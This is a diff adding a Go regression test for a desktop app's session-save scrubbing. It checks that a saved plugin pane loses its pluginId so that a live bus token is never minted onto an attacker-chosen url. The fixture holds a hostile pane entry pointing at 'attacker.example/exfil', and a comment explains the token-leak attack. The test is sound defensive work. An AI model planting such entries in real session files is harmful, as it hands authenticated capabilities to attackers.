@@ -118,6 +118,46 @@ func TestSessionsSaveStripsPaneEscalationFields(t *testing.T) {
 	}
 }
 
+// A restored `plugin` pane whose `pluginId` names a loaded plugin makes the
+// desktop's PluginPane MINT a live plugin-scoped hub-bus token and splice it
+// onto the pane's `url` before loading it in the webview. A bus-written
+// sessions.save that set url:"https://attacker/x" + pluginId:"<loaded>" would
+// have the host hand a fresh authenticated capability to an attacker origin on
+// its next launch. Dropping `pluginId` makes the pane un-mintable; the url then
+// loads unauthenticated (parity with a browser pane).
+func TestSessionsSaveStripsPluginPaneToken(t *testing.T) {
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	r := &registry{}
+
+	params := json.RawMessage(`{
+	  "name":"restored",
+	  "activeAgentId":"a1",
+	  "agents":[{"id":"a1","cwd":"/","provider":"claude","tabs":[
+	     {"id":"t1","title":"T","panes":[
+	        {"id":"p1","type":"plugin","title":"pl","cwd":"/home/user/project",
+	         "url":"https://attacker.example/exfil","pluginId":"djtouchette.shiplight"}]}]}]
+	}`)
+	if _, err := r.savedSessionSave(params); err != nil {
+		t.Fatal(err)
+	}
+	raw, err := r.savedSessionLoad(json.RawMessage(`{"filename":"restored.yaml"}`))
+	if err != nil {
+		t.Fatal(err)
+	}
+	doc := string(raw)
+	if strings.Contains(doc, "djtouchette.shiplight") {
+		t.Errorf("the persisted boot-restore document still carries the plugin pane's pluginId:\n%s\nOn restore PluginPane mints a live plugin-scoped bus token against it and splices it onto the pane's url — leaking a fresh capability to whatever origin the url names.", doc)
+	}
+	// FLOOR: the pane itself survives (minus the mint gate); url is intentionally
+	// kept — without pluginId it loads unauthenticated, at parity with a browser
+	// pane, and it is shared with the browser pane type.
+	for _, keep := range []string{"p1", "plugin", "t1"} {
+		if !strings.Contains(doc, keep) {
+			t.Fatalf("the scrub removed more than the plugin mint gate — %q is gone:\n%s", keep, doc)
+		}
+	}
+}
+
 // THREE COPIES OF TWO LISTS. internal/layout scrubs layout.set, cmd/brain scrubs
 // sessions.save + layouts.save, and the desktop scrubs its own twins of both. A
 // field added to one list and not the others is a door that reopens, which is
@@ -149,7 +189,7 @@ func TestBootDocumentWritersScrubTheSameFields(t *testing.T) {
 	if len(spawnEscalationKeys) < 4 {
 		t.Fatalf("the scrub list holds %d fields — it shrank, and every loop above passes on a shorter list", len(spawnEscalationKeys))
 	}
-	if len(paneEscalationKeys) < 2 {
+	if len(paneEscalationKeys) < 3 {
 		t.Fatalf("the pane scrub list holds %d fields — it shrank, and every loop above passes on a shorter list", len(paneEscalationKeys))
 	}
 }
